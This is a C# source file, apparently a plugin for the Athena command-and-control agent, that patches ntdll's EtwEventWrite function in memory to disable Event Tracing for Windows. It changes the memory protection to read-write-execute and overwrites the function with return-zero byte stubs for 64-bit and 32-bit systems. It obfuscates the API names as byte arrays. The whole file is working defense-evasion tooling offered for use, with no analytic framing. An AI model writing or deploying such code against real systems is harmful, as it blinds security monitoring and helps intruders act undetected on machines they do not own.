using PluginBase;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Athena
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    public static class etw
    {
        //Credit to code goes to Adeam Chester @_xpn_ - https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
        //https://twitter.com/_xpn_

        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            try
            {

                if (Environment.Is64BitOperatingSystem)
                {
                    if (doit(new byte[] { 0x48, 0x33, 0xC0, 0xC3 }))
                    {
                        return new ResponseResult
                        {
                            completed = "true",
                            user_output = "Success",
                            task_id = (string)args["task-id"],
                        };
                    }
                    else
                    {
                        return new ResponseResult
                        {
                            completed = "true",
                            user_output = "Failed",
                            task_id = (string)args["task-id"],
                            status = "error"
                        };
                    }
                }
                else
                {
                    if (doit(new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 }))
                    {
                        return new ResponseResult
                        {
                            completed = "true",
                            user_output = "Success",
                            task_id = (string)args["task-id"],
                        };
                    }
                    else
                    {
                        return new ResponseResult
                        {
                            completed = "true",
                            user_output = "Failed",
                            task_id = (string)args["task-id"],
                            status = "error"
                        };
                    }
                }

            }
            catch (Exception e)
            {
                //oh no an error
                return new ResponseResult
                {
                    completed = "true",
                    user_output = e.Message,
                    task_id = (string)args["task-id"],
                    status = "error"
                };
            }
        }
        private static bool doit(byte[] patch)
        {
            try
            {
                uint oldProtect;
                byte[] nb = new byte[] { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c };
                var ntdll = Win32.LoadLibrary(Encoding.ASCII.GetString(nb));

                byte[] ew = new byte[] { 0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65 };
                var etwEventSend = Win32.GetProcAddress(ntdll, Encoding.ASCII.GetString(ew));

                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }

}
